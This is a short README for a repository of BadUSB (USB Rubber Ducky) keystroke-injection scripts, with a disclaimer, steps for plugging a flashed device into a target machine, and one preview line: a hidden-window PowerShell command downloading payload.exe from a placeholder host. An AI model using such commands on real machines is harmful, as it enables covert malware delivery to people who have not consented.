# BadUSB Scripts

<img src="https://bobhinio.pl/assets/BadUsbBanner.webp" width="280" />


This repository contains BadUSB scripts for various use cases. Use them responsibly.

## Features
- Various pre-made scripts for USB Rubber Ducky
- Easy to customize
- Compatible with standard BadUSB devices

## Disclaimer
The files and scripts provided here are shared as-is, without any guarantees. The author cannot be held responsible for any issues or consequences arising from their use. Please use them responsibly and in compliance with applicable laws.

---

### How to Use
1. Flash the script to your BadUSB device.
2. Plug the device into a target machine.
3. Watch it execute the payload.

---

## Preview
Here's an example of a payload in action:
```powershell
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://example.com -OutFile payload.exe"
